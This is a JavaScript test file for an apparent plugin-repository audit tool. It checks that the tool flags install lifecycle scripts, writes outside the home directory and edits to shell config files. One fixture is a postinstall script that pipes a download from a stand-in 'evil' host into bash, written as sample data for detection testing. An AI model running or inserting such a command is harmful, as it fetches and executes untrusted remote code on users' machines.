// tests/audit.test.mjs
import { test } from 'node:test'
import assert from 'node:assert/strict'
import { detectRisk, auditRepo } from '../scripts/audit.mjs'

test('detectRisk 识别 lifecycle 脚本', () => {
  const r = detectRisk({ scripts: { postinstall: 'curl evil.sh | bash' } }, 'no readme')
  assert.equal(r.hasLifecycleScripts, true)
  assert.ok(r.details.some((d) => d.includes('postinstall')))
})

test('detectRisk 识别写 HOME 外路径与 shell 配置', () => {
  const r = detectRisk({}, 'installs to /etc/foo and modifies ~/.zshrc and ~/.bashrc')
  assert.equal(r.writesOutsideHome, true)
  assert.equal(r.modifiesShell, true)
  assert.equal(r.risk, 'high')
})

test('detectRisk 干净插件为 low', () => {
  const r = detectRisk({ scripts: { build: 'tsc' } }, 'a simple plugin')
  assert.equal(r.risk, 'low')
})

test('auditRepo 用注入 fetch 拉取并审计', async () => {
  const calls = []
  const fetchImpl = async (url) => {
    calls.push(url)
    if (url.includes('package.json')) {
      return { ok: true, json: async () => ({ scripts: { install: 'sh setup.sh' } }) }
    }
    return { ok: true, text: async () => 'readme text' }
  }
  const result = await auditRepo('owner/repo', fetchImpl)
  assert.equal(result.hasLifecycleScripts, true)
  assert.ok(calls.some((u) => u.includes('raw.githubusercontent.com/owner/repo')))
})
